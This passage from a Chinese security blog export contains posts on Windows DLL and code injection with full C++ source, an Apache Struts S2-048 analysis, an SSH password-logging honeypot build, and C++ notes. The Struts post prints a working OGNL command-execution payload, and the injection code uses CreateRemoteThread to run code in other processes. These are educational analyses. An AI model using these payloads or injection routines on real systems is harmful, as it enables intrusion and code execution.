class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">VOID CInjectDllDlg::InjectDll(DWORD dwPid, char *szDllName)</span><br><span class="line">&#123;</span><br><span class="line">    if ( dwPid == 0 || lstrlen(szDllName) == 0 )</span><br><span class="line">    &#123;</span><br><span class="line">        return ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char *pFunName = &quot;LoadLibraryA&quot;;</span><br><span class="line"></span><br><span class="line">    // 打开目标进程</span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, </span><br><span class="line">                                  FALSE, dwPid);</span><br><span class="line"></span><br><span class="line">    if ( hProcess == NULL )</span><br><span class="line">    &#123;</span><br><span class="line">        return ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 计算欲注入DLL文件完整路径的长度</span><br><span class="line">    int nDllLen = lstrlen(szDllName) + sizeof(char);</span><br><span class="line"></span><br><span class="line">    // 在目标进程申请一块长度为nDllLen大小的内存空间</span><br><span class="line">    PVOID pDllAddr = VirtualAllocEx(hProcess,</span><br><span class="line">                                    NULL, nDllLen,</span><br><span class="line">                                    MEM_COMMIT,</span><br><span class="line">                                    PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    if ( pDllAddr == NULL )</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        return ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD dwWriteNum = 0;</span><br><span class="line"></span><br><span class="line">    // 将欲注入DLL文件的完整路径写入在目标进程中申请的空间内</span><br><span class="line">    WriteProcessMemory(hProcess, pDllAddr, szDllName, </span><br><span class="line">                       nDllLen, &amp;dwWriteNum);</span><br><span class="line"></span><br><span class="line">    // 获得LoadLibraryA()函数的地址</span><br><span class="line">    FARPROC pFunAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;),</span><br><span class="line">                                      pFunName);</span><br><span class="line"></span><br><span class="line">    // 创建远程线程</span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess,</span><br><span class="line">                         NULL, 0,</span><br><span class="line">                         (LPTHREAD_START_ROUTINE)pFunAddr,</span><br><span class="line">                         pDllAddr, 0, NULL);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void CInjectDllDlg::OnBtnUninject() </span><br><span class="line">&#123;</span><br><span class="line">    // TODO: Add your control notification handler code here</span><br><span class="line">    char szDllName[MAX_PATH] = &#123; 0 &#125;;</span><br><span class="line">    char szProcessName[MAXBYTE] = &#123; 0 &#125;;</span><br><span class="line">    DWORD dwPid = 0;</span><br><span class="line">    </span><br><span class="line">    GetDlgItemText(IDC_EDIT_DLLFILE, szDllName, MAX_PATH);</span><br><span class="line">    GetDlgItemText(IDC_EDIT_PROCESSNAME, szProcessName, MAXBYTE);</span><br><span class="line">    </span><br><span class="line">    // 由进程名获得PID</span><br><span class="line">    dwPid = GetProcId(szProcessName);</span><br><span class="line">    </span><br><span class="line">    // 注入szDllName到dwPid</span><br><span class="line">    UnInjectDll(dwPid, szDllName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID CInjectDllDlg::UnInjectDll(DWORD dwPid, char *szDllName)</span><br><span class="line">&#123;</span><br><span class="line">    if ( dwPid == 0 || lstrlen(szDllName) == 0 )</span><br><span class="line">    &#123;</span><br><span class="line">        return ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HANDLE hSnap = CreateToolhelp32Snapshot(</span><br><span class="line">                            TH32CS_SNAPMODULE, </span><br><span class="line">                            dwPid);</span><br><span class="line"></span><br><span class="line">    MODULEENTRY32 me32;</span><br><span class="line">    me32.dwSize = sizeof(me32);</span><br><span class="line"></span><br><span class="line">    // 查找匹配的进程名称</span><br><span class="line">    BOOL bRet = Module32First(hSnap, &amp;me32);</span><br><span class="line">    while ( bRet )</span><br><span class="line">    &#123;</span><br><span class="line">        if ( lstrcmp(strupr(me32.szExePath), </span><br><span class="line">                     strupr(szDllName)) == 0 )</span><br><span class="line">        &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bRet = Module32Next(hSnap, &amp;me32);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hSnap);</span><br><span class="line"></span><br><span class="line">    char *pFunName = &quot;FreeLibrary&quot;;</span><br><span class="line"></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, </span><br><span class="line">                                  FALSE, dwPid);</span><br><span class="line">    if ( hProcess == NULL )</span><br><span class="line">    &#123;</span><br><span class="line">        return ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FARPROC pFunAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;),</span><br><span class="line">                                      pFunName);</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, </span><br><span class="line">                                        (LPTHREAD_START_ROUTINE)pFunAddr,</span><br><span class="line">                                        me32.hModule, 0, NULL);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp; 整个注入与卸载的过程其实就是让远程线程执行一次LoadLibrary()函数或FreeLibrary()函数。</p><h4 id="无DLL的代码注入"><a href="#无DLL的代码注入" class="headerlink" title="无DLL的代码注入"></a>无DLL的代码注入</h4><p>  <img src="/2017/07/16/windows DLL注入/2.png" alt=""><br>关键性代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _DATA</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwLoadLibrary;</span><br><span class="line">    DWORD dwGetProcAddress;</span><br><span class="line">    DWORD dwGetModuleHandle;</span><br><span class="line">    DWORD dwGetModuleFileName;</span><br><span class="line"></span><br><span class="line">    char User32Dll[STRLEN];</span><br><span class="line">    char MessageBox[STRLEN];</span><br><span class="line">    char Str[STRLEN];</span><br><span class="line">&#125;DATA, *PDATA;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI RemoteThreadProc(LPVOID lpParam)</span><br><span class="line">&#123;</span><br><span class="line">    PDATA pData = (PDATA)lpParam;</span><br><span class="line"></span><br><span class="line">    // 定义API函数原型</span><br><span class="line">    HMODULE (__stdcall *MyLoadLibrary)(LPCTSTR);</span><br><span class="line">    FARPROC (__stdcall *MyGetProcAddress)(HMODULE, LPCSTR);</span><br><span class="line">    HMODULE (__stdcall *MyGetModuleHandle)(LPCTSTR);</span><br><span class="line">    int (__stdcall *MyMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT);</span><br><span class="line">    DWORD (__stdcall *MyGetModuleFileName)(HMODULE, LPTSTR, DWORD);</span><br><span class="line"></span><br><span class="line">    MyLoadLibrary = (HMODULE (__stdcall *)(LPCTSTR))</span><br><span class="line">                                            pData-&gt;dwLoadLibrary;</span><br><span class="line">    MyGetProcAddress = (FARPROC (__stdcall *)(HMODULE, LPCSTR))</span><br><span class="line">                                            pData-&gt;dwGetProcAddress;</span><br><span class="line">    MyGetModuleHandle = (HMODULE (__stdcall *)(LPCSTR))</span><br><span class="line">                                            pData-&gt;dwGetModuleHandle;</span><br><span class="line">    MyGetModuleFileName = (DWORD (__stdcall *)(HMODULE, LPTSTR, DWORD))</span><br><span class="line">                                            pData-&gt;dwGetModuleFileName;</span><br><span class="line"></span><br><span class="line">    HMODULE hModule = MyLoadLibrary(pData-&gt;User32Dll);</span><br><span class="line">    MyMessageBox = (int (__stdcall *)(HWND, LPCTSTR, LPCTSTR, UINT))</span><br><span class="line">                                  MyGetProcAddress(hModule, pData-&gt;MessageBox);</span><br><span class="line"></span><br><span class="line">    char szModuleFileName[MAX_PATH] = &#123; 0 &#125;;</span><br><span class="line">    MyGetModuleFileName(NULL, szModuleFileName, MAX_PATH);</span><br><span class="line"></span><br><span class="line">    MyMessageBox(NULL, pData-&gt;Str, szModuleFileName, MB_OK);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID CNoDllInjectDlg::InjectCode(DWORD dwPid)</span><br><span class="line">&#123;</span><br><span class="line">    // 打开进程并获取进程句柄</span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, </span><br><span class="line">                                  FALSE, dwPid);</span><br><span class="line"></span><br><span class="line">    if ( hProcess == NULL )</span><br><span class="line">    &#123;</span><br><span class="line">        return ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DATA Data = &#123; 0 &#125;;</span><br><span class="line"></span><br><span class="line">    // 获取kernel32.dll中相关的导出函数</span><br><span class="line">    Data.dwLoadLibrary = (DWORD)GetProcAddress(</span><br><span class="line">                                    GetModuleHandle(&quot;kernel32.dll&quot;),</span><br><span class="line">                                    &quot;LoadLibraryA&quot;);</span><br><span class="line">    Data.dwGetProcAddress = (DWORD)GetProcAddress(</span><br><span class="line">                                    GetModuleHandle(&quot;kernel32.dll&quot;),</span><br><span class="line">                                    &quot;GetProcAddress&quot;);</span><br><span class="line">    Data.dwGetModuleHandle = (DWORD)GetProcAddress(</span><br><span class="line">                                    GetModuleHandle(&quot;kernel32.dll&quot;),</span><br><span class="line">                                    &quot;GetModuleHandleA&quot;);</span><br><span class="line">    Data.dwGetModuleFileName = (DWORD)GetProcAddress(</span><br><span class="line">                                    GetModuleHandle(&quot;kernel32.dll&quot;),</span><br><span class="line">                                    &quot;GetModuleFileNameA&quot;);</span><br><span class="line"></span><br><span class="line">    // 需要的其他DLL和导出函数</span><br><span class="line">    lstrcpy(Data.User32Dll, &quot;user32.dll&quot;);</span><br><span class="line">    lstrcpy(Data.MessageBox, &quot;MessageBoxA&quot;);</span><br><span class="line">    // MessageBoxA()弹出的字符串</span><br><span class="line">    lstrcpy(Data.Str, &quot;Inject Code !!!&quot;);</span><br><span class="line"></span><br><span class="line">    // 在目标进程申请空间</span><br><span class="line">    LPVOID lpData = VirtualAllocEx(hProcess, NULL, sizeof(Data),</span><br><span class="line">                                   MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">                                   PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    DWORD dwWriteNum = 0;</span><br><span class="line">    WriteProcessMemory(hProcess, lpData, &amp;Data, </span><br><span class="line">                       sizeof(Data), &amp;dwWriteNum);</span><br><span class="line"></span><br><span class="line">    // 在目标进程空间申请的用于保存代码的长度</span><br><span class="line">    DWORD dwFunSize = 0x1000;</span><br><span class="line">    LPVOID lpCode = VirtualAllocEx(hProcess, NULL, dwFunSize,</span><br><span class="line">                                   MEM_COMMIT, </span><br><span class="line">                                   PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    BOOL bRet = WriteProcessMemory(hProcess, lpCode, &amp;RemoteThreadProc, </span><br><span class="line">                       dwFunSize, &amp;dwWriteNum);</span><br><span class="line"></span><br><span class="line">    if ( bRet == FALSE )</span><br><span class="line">    &#123;</span><br><span class="line">        int n = GetLastError();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,</span><br><span class="line">                                        (LPTHREAD_START_ROUTINE)lpCode,</span><br><span class="line">                                        lpData, 0, NULL);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过peid可以查看DLL的导出函数<br><img src="/2017/07/16/windows DLL注入/3.png" alt=""><br>还可以通过vc6自带的dependency Walker以及CFF Explorer<br><img src="/2017/07/16/windows DLL注入/4.png" alt=""><br><img src="/2017/07/16/windows DLL注入/5.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;这种方式是直接把想要使用的API函数以及API函数所在的DLL文件都封装在一个结构体中，直接写入目标进程的空间中，最后调用CreateRemoteThread()函数即可将其运行。</p><h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p>通过windows自带工具运行DLL的两种方法<br>1.通过regsvr32.exe 调用  例如 regsvr32  /i  c:\test.dll<br>2.通过rundll32.exe 调用  例如 rundll32.exe  “c:\test.dll” ,RundllFunc FunParam<br>3.通过Dependency Walker工具查看应用程序所使用到的动态链接库文件,此外还可以使用dumpbin工具<br><img src="/2017/07/16/windows DLL注入/dependency.png" alt=""><br><img src="/2017/07/16/windows DLL注入/dumpbin.png" alt=""></p><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="http://bbs.pediy.com/thread-66452.htm" target="_blank" rel="noopener">神奇的马甲Dll By 海风月影</a><br><a href="http://www.freebuf.com/articles/system/94693.html" target="_blank" rel="noopener">DLL注入的几种姿势（二）：CreateRemoteThread And More</a><br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf" target="_blank" rel="noopener">windows进程注入</a></p>]]></content>
      
      <categories>
          
          <category> windows安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>s2-048漏洞分析</title>
      <link href="/2017/07/08/s2-048%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2017/07/08/s2-048%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h4 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h4><p>&nbsp;&nbsp;  昨天下午下班前看到朋友圈有人已经在转发s2-048的漏洞通告，见链接 <a href="https://cwiki.apache.org/confluence/display/WW/S2-048" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-048</a>,晚上的时候简单的复现了一下，今天没事儿就跟了一下。</p><h4 id="0x02-从官方通告到poc"><a href="#0x02-从官方通告到poc" class="headerlink" title="0x02 从官方通告到poc"></a>0x02 从官方通告到poc</h4><p>&nbsp;&nbsp; 从官方通告到概念性证明这是一个考验能力的地方，但是万事都有技巧和经验。官方通告往往信息量是最大的，首先，通过官方通告如下图所示可以得到至少五个重要的信息点<br><img src="/2017/07/08/s2-048漏洞分析/1.png" alt=""></p><ul><li>1.这是一个远程命令执行漏洞</li><li>2.这个漏洞存在showcase示例应用中，这个很重要，能让我们最快的时间去找到相应的漏洞环境</li><li>3.这个漏洞struts1的插件有关</li><li>4.这个漏洞影响的版本是struts 2.3x系列</li><li>5.漏洞的解决方法，这里是代码的正确写法，此处是找到漏洞触发点的关键<br>1.首先，我们从官网<a href="http://struts.apache.org/download.cgi#struts25101" target="_blank" rel="noopener">http://struts.apache.org/download.cgi#struts25101</a>下载对应的struts以及showcase。<br>2.将war包部署到应用服务器，我这里用了tomcat，打开struts-showcase如下图所示：<br><img src="/2017/07/08/s2-048漏洞分析/2.png" alt=""><br>3.查找关键性代码<br><img src="/2017/07/08/s2-048漏洞分析/3.png" alt=""><br>可以看到箭头所指的地方就使用到了官方不’提倡’使用的规范，应该就是这个地方了。<br>打开这个页面可以看到这里有三个输入的地方，这里应该就是恶意代码插入的地方。<br><img src="/2017/07/08/s2-048漏洞分析/4.png" alt=""><br>4.代码调试<br>这个时候就该上eclipse了，跟踪一下数据流向。我们先在此处加个断点<br><img src="/2017/07/08/s2-048漏洞分析/5.png" alt=""><br>通过调试会发现M0rk参数会进入buildMessageFormat()这个函数里面<br><img src="/2017/07/08/s2-048漏洞分析/6.png" alt=""><br>很熟悉有木有，这个就是s2-045漏洞(详见之前的文章<a href="http://www.cnblogs.com/mrchang/p/6515150.html" target="_blank" rel="noopener">http://www.cnblogs.com/mrchang/p/6515150.html</a>)里面的利用点，直接利用不就行了嘛。直接将name参数修改为s2-045的payload就行了.<br>payload如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#szgx=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos; open /Applications/Calculator.app&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2017/07/08/s2-048漏洞分析/7.png" alt=""></p><h4 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a>0X03 总结</h4><p>&nbsp;&nbsp; 这里没有具体的分析这个struts1插件功能以及payload，只是简单和大家分享一下从官方通告到自己出poc的一个流程，还是有经验可循的，当你分析的漏洞多了，这个过程会很快。<br>水了一篇：）</p>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ssh蜜罐搭建</title>
      <link href="/2017/06/25/ssh%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA/"/>
      <url>/2017/06/25/ssh%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA/</url>
      <content type="html"><![CDATA[<h4 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;本来觉得应该不是一件很复杂的事，结果搞了三个小时才搞定(可能是我太菜吧)，里面有几个坑，记录一下。<br>一直以来想去做蜜罐这么个东西，ssh is only the begining!<br>ssh secure shell，就是安全的shell，至于为什么安全呢？怎么就安全了呢？</p><ol><li>较rlogin、rsh等这些不加密的协议，ssh传输是加密的，历史上ssh协议的实现有openssh和ossh，前者是主流，后面非特殊情况涉及到的ssh实现均指的是openssh。</li><li>ssh协议有两个版本SSH-1 and SSH-2。ssh提供了两种方式的认证，一种是密码登录方式的认证，另外一种是基于秘钥的认证。第一种就是提供的默认加密算法是椭圆曲线加密算法ecdsa-sha2-nistp256，第二种是将rsa的公钥写到服务器的authorized_keys中实现免密码登录。<h4 id="0x02-具体安装步骤"><a href="#0x02-具体安装步骤" class="headerlink" title="0x02 具体安装步骤"></a>0x02 具体安装步骤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本次测试是在ubuntu14.04X64环境下测试</span><br></pre></td></tr></table></figure></li></ol><p>1.首先git clone这两个资源<a href="https://github.com/openssh/openssh-portable" target="_blank" rel="noopener">https://github.com/openssh/openssh-portable</a><br><a href="https://github.com/w8rbt/sshlog" target="_blank" rel="noopener">https://github.com/w8rbt/sshlog</a><br>2.’打补丁’。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ patch --dry-run &lt; sshlog.patch</span><br><span class="line">$ patch &lt; sshlog.patch</span><br></pre></td></tr></table></figure></p><p>运行上面两条命令，其实就是在auth-passwd.c中加上几行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">struct ssh *ssh = active_state;</span><br><span class="line"></span><br><span class="line">       if(authctxt-&gt;user &amp;&amp; password &amp;&amp; ssh) &#123;</span><br><span class="line">logit(&quot;sshlog: %.100s %s %.200s %lu&quot;, </span><br><span class="line">authctxt-&gt;user, </span><br><span class="line">password, </span><br><span class="line">ssh_remote_ipaddr(ssh),</span><br><span class="line">(unsigned long)time(NULL));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">       else &#123;</span><br><span class="line">logit(&quot;sshlog: unable to log attempt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.安装前检查<br>发现源码中没有configure文件，原来是需要自己运行autoreconf这个来生成configure文件,参考官方说明：<a href="http://www.openssh.com/portable.html" target="_blank" rel="noopener">http://www.openssh.com/portable.html</a><br>4.编译<br>编译的时候需要安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libz-dev</span><br><span class="line">$ sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure><p>5.链接和安装<br>这个时候又会报一个错<br>Privilege separation user sshd does not exist<br>这个时候需要在/etc/passwd文件中加入 ： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br></pre></td></tr></table></figure><p>6.Done!<br><img src="/2017/06/25/ssh蜜罐搭建/1.png" alt=""><br><img src="/2017/06/25/ssh蜜罐搭建/2.png" alt=""></p><h4 id="0x03-待续"><a href="#0x03-待续" class="headerlink" title="0x03 待续"></a>0x03 待续</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">图形化界面实时展示ssh被爆破记录</span><br></pre></td></tr></table></figure><h4 id="0x04-reference"><a href="#0x04-reference" class="headerlink" title="0x04 reference"></a>0x04 reference</h4><p>1.<a href="https://www.wikiwand.com/en/Secure_Shell" target="_blank" rel="noopener">https://www.wikiwand.com/en/Secure_Shell</a><br>2.<a href="https://www.wikiwand.com/en/Elliptic_curve_cryptography" target="_blank" rel="noopener">https://www.wikiwand.com/en/Elliptic_curve_cryptography</a><br>3.<a href="https://my.oschina.net/realfighter/blog/388486" target="_blank" rel="noopener">https://my.oschina.net/realfighter/blog/388486</a><br>4.<a href="https://m14.cc/magic-behind-compiling-software/" target="_blank" rel="noopener">https://m14.cc/magic-behind-compiling-software/</a></p>]]></content>
      
      <categories>
          
          <category> 日常分享 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>c和c++易混淆点笔记</title>
      <link href="/2017/06/12/c-%E6%98%93%E6%B7%B7%E6%B7%86%E7%82%B9%E7%AC%94%E8%AE%B0/"/>
      <url>/2017/06/12/c-%E6%98%93%E6%B7%B7%E6%B7%86%E7%82%B9%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><ul><li>主要记录一些容易忽略和忘记的知识点，原因是有些知识点刚看过之后觉的懂了，但是过段时间可能又忘记了的情况。<h4 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h4></li><li>基本数据类型<br><a href="http://zh.cppreference.com/w/cpp/language/types" target="_blank" rel="noopener">Fundamental types</a><br><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa383751(v=vs.85" target="_blank" rel="noopener">Windows Data Types</a>.aspx)</li><li>指针类型和引用类型</li><li>构造函数初始化数据成员的方式，除了在函数体中使用复制和赋值等方法外，还可以使用初始化表，初始化表位于参数表和函数体之间，以：开头，由一个或多个初始化项构成，多个初始化项以逗号相分隔，一般的形式为：<br><br>:数据成员1（表达式1），。。。，数据成员n（表达式n）<br><br>常值数据成员、对象成员和从基类继承来的数据成员等特殊成员的初始化，必须采用初始化表<br><br>(不得不说语法真是复杂，还是必须。。)</li><li>函数指针和回调函数<br><a href="http://www.runoob.com/cprogramming/c-fun-pointer-callback.html" target="_blank" rel="noopener">参考</a>刚开始还不好理解，其实还挺有意思的，就是你可以函数指针变量可以作为某个函数的参数来使用，那么这个函数</li><li>内联函数<br>可以这么理解，调用函数的时候，系统需要做一系列的辅助工作(例如保护现场，为函数所用变量分配内存，实参赋值给形参等)，然后转去执行被调用函数的函数体，当执行完成后，还要做一系列的辅助工作，再接着执行函数调用之后的语句。这个过程时候时间开销的，为了节省时间，c++允许定义内联函数，就是函数在编译的时候会把你的调用处的函数替换成函数体。虽然代码存储空间可能变大了，但是整个程序的执行时间变小了。<br><br>此外，在类体内定义的成员函数默认为内联的，而要在类体外定义内联的成员函数，则需要用关键字inline进行声明。</li><li>函数重载<br>函数重载是指多个函数使用相同的函数名。函数重载是多态性的体现，即用同一个函数名实现多种函数调用。函数重载一般是函数的参数个数或者参数类型不同，这个时候，编译器会根据这个差别来进行差别性编译。</li><li>虚函数和纯虚函数<br>虚函数其实就是虚拟函数的意思，virtual function，感觉翻译成虚拟函数就挺好的，不知道为啥翻译到国内就是叫虚函数，感觉怪怪的。这个虚拟函数和函数重载的概念有点儿相似，在派生类中可以通过重写虚拟函数来实现对基类虚拟函数的覆盖。（感觉像是java里面的接口），这也是多态性的体现（注意这里是运行时的多态性，不同于函数重载编译时的多态性）。<a href="http://www.runoob.com/cplusplus/cpp-interfaces.html" target="_blank" rel="noopener">c++接口(抽象类)</a></li><li>std standard的缩写，我们在使用c++的标准库的标识符的时候需要使用using namespace std；使用了命名空间std的有  cstdio cmath  csring string等。</li><li>今天学习STL,才真正意识到什么是容器。也觉得以前都没有怎么去理解容器，每一种语言都有自己的容器，像python中有list、dict、tuple等容器，java中有arraylist、hashset、hashmap等容器，可以说容器是复杂的数据结构(相对于简单的数据结构int，float这种)。c++ 中标准STL序列容器：vector、string、deque和list。<br><br>标准STL关联容器：set、multiset、map和multimap。每种容器类型都定义了自己的迭代器类型，如vector<br><br>vector<int>::iterator iter;这条语句定义了一个名为iter的变量，它的数据类型是由vector<int>定义的iterator类型。<br><br>list<int>::iterator iter1;这条语句定义了一个名为iter1的变量，它的数据类型是由list<int>定义的iterator类型。<br><br><a href="https://www.wikiwand.com/zh-hans/%E5%AE%B9%E5%99%A8_(%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B" target="_blank" rel="noopener">wiki对容器的介绍</a>)</int></int></int></int></li><li>C++ 的可移植性和跨平台开发<br><a href="https://msdn.microsoft.com/zh-cn/library/dn707591.aspx" target="_blank" 